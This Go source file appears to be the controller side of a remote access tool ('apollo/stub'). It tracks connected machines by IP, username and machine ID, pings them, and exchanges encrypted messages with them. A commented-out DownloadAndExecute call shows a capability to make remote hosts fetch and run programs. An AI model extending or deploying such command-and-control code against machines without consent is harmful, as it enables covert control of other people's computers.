package client

import (
	"apollo/stub/message/types"
	"bytes"
	"encoding/gob"
	"errors"
	"fmt"
	log "github.com/sirupsen/logrus"
	"net"
	"sync"
	"time"
)

func GetOnlineClients() []*Client {
	var clients []*Client
	for client, connected := range Clients {
		if connected {
			clients = append(clients, client)
		}
	}
	return clients
}

var Clients = make(map[*Client]bool) // Client set

type Client struct {
	conn            net.Conn
	mux             sync.Mutex
	IP              string
	BasicSystemInfo types.BasicSystemInfo
	SystemInfo      types.SystemInfo
	ID              int // consecutive ID of the client
	IsConnected     bool
}

func NewClient(conn net.Conn) Client {
	newClient := Client{conn: conn, IP: conn.RemoteAddr().String(), ID: getNewId()}
	go newClient.OnConnect() // Run the OnConnect function
	return newClient
}

// This function runs when the client connects for the first time
func (c *Client) OnConnect() {
	if err := c.Ping(); err != nil { // Ping the client to see if it is working
		return
	}
	c.IsConnected = true
	basicSystemInfo, err := c.GetBasicSystemInfo() // Cache the basic system info

	if err == nil {
		client, connected := getClientByMachineId(basicSystemInfo.MachineID) // Check if there is already another client with the same machine ID
		if client != nil {
			if connected { // If we have a client with the same machine ID and they are connected
				log.Debugf("Client %s tried to connect but we already have a client with the same machine ID", c.String())
				c.Delete()
				delete(Clients, c)		// Fully remove c from the client list
				return
			} else { // We have the client in our client list but they are disconnected
				log.Debugf("Client %s is already in the client list", c.String())
				conn := c.conn // Preserve the connection we have now but use the data from the cached client
				c = client
				c.conn = conn
				c.IsConnected = true
			}
		}
	} else {
		log.Debugf("error getting basic system info: %s", err)
	}

	Clients[c] = true // Append the new client to the client list

	// Set a loop to ping the client every 5 seconds
	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !c.IsConnected {
				break
			}
			if err := c.Ping(); err != nil {
				break
			}
		}
	}()

	if err == nil {
		log.Printf("New client connected with IP %s and username %s (%s)", c.IP, basicSystemInfo.Username, basicSystemInfo.MachineID)
	}
	//err = c.DownloadAndExecute("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", nil)
	//if err != nil {
	//	log.Println(err)
	//}
}

// Deletes the client from the client list and closes the connection
func (c *Client) Delete() {
	log.Printf("Client %s disconnected", c)
	if _, ok := Clients[c]; ok {	// Check if the client is in the list before we remove it
		Clients[c] = false
	}
	c.IsConnected = false
	_ = c.conn.Close() // Close the connection
}

func (c Client) String() string {
	if c.BasicSystemInfo != (types.BasicSystemInfo{}) {
		return fmt.Sprintf("(%d) %s; %s", c.ID, c.IP, c.BasicSystemInfo.Username)
	}
	return c.IP
}

// Send data and wait for a response
func (c *Client) Send(b []byte) ([]byte, error) {
	log.Debugf("Sending %v to client %s", b, c)

	c.mux.Lock()                       // Lock the mutex so only one thread can access the client at once
	defer c.mux.Unlock()               // Unlock it when the function is done
	_, err := c.conn.Write(Encrypt(b)) // Try to write data
	if err != nil {                    // If there is an error, print an error and delete the client
		log.Debugf("Error writing to client %s: %s Removing the client", c, err)
		c.Delete()
		return nil, err
	}

	/// Get response
	err = c.conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // Make the read time out after 60 seconds
	resp := make([]byte, 4096)
	n, err := c.conn.Read(resp)
	resp = resp[:n]
	resp = Decrypt(resp)
	if err != nil {
		// For some reason there was an error reading
		log.Debugf("Error reading from client %s: %s", c, err)
		_ = c.Ping() // Ping the client and remove it if it can't ping
		return nil, err
	}
	// If we successfully read from the client, return the response and no error
	// The last item of the response is cut off because it is a \n
	log.Debugf("Received %v from client %s", resp, c)
	return resp, nil
}

/*
 * Sends a structured message to the client.
 * Params:
 *   messageID
 *   data: the data that will be serialized and sent to the client
 *   response: A pointer to the struct to store the response in
 *   expectedResponseID: If the actual response ID differs from this variable, it will return an error
 * Returns:
 *   responseID: the ID of the response
 *   err: any errors
 */
func (c *Client) SendMessage(messageID int, data interface{}, response interface{}, expectedResponseID byte) error {
	// Check if messageID is too large
	if messageID > 255 {
		errors.New("message ID is too large")
	}
	// Check if messageID is too large
	if messageID > 255 {
		return errors.New("message ID is too large")
	}

	var payloadBuffer bytes.Buffer
	if data != nil { // Add the payload to the buffer if there is a payload
		encoder := gob.NewEncoder(&payloadBuffer)
		err := encoder.Encode(data)
		if err != nil { // If there is an error encoding, return it
			log.Printf("error encoding: %s", err)
			return err
		}
	}

	resp, err := c.Send(append([]byte{byte(messageID)}, payloadBuffer.Bytes()...)) // Create a new byte array with the messageID as the
	// first byte and the data as the rest
	if err != nil { // Return the error if we get one
		return err
	}
	// If we don't get any errors, return the first byte of the response as the responseID and the rest as the responseData
	// If the response is only one byte, return just the response ID
	if len(resp) == 0 { // If the length of the response is 0, return nothing
		return nil
	}
	if resp[0] != expectedResponseID { // If the response id is different than expected
		return errors.New(fmt.Sprintf("response id different than expected: received %x, expected %x", resp[0], expectedResponseID))
	}
	if len(resp) == 1 { // If the length of the response is 1, return nothing
		return nil
	}
	// Otherwise, deserialize the data and return that
	buff := bytes.NewBuffer(resp[1:]) // Don't use the first element of the buffer
	decoder := gob.NewDecoder(buff)
	err = decoder.Decode(response)
	if err != nil {
		log.Printf("error decoding: %s", err)
		return err
	}
	return nil
}

/*
 * Generates a new client ID which is not in use by any other client
 */
func getNewId() int {
	var usedIds []int
	for client := range Clients {
		usedIds = append(usedIds, client.ID)
	}
	for i := 1;; i++ { // Find the lowest possible ID
		// Check if the ID is in our userIds slice
		idUsed := false	// This will turn true if the ID is already used
		for _, id := range usedIds {
			if id == i { // If we find the ID
				idUsed = true
				break
			}
		}
		if idUsed {
			continue
		}
		return i // We found a unique ID; return it
	}
}

func getClientByMachineId(id string) (client *Client, connected bool) {
	for cl, _ := range Clients {
		if cl.BasicSystemInfo.MachineID == id {
			return cl, cl.Ping() == nil // If we get no error while pinging the client is connected
		}
	}
	return nil, false
}

/*
 * Gets a client by the client ID
 * If there are no clients with that ID, it will return nil
 * Note: this will return disconnected clients
 */
func GetClientById(id int) *Client {
	for client := range Clients {
		if client.ID == id {
			return client
		}
	}
	return nil
}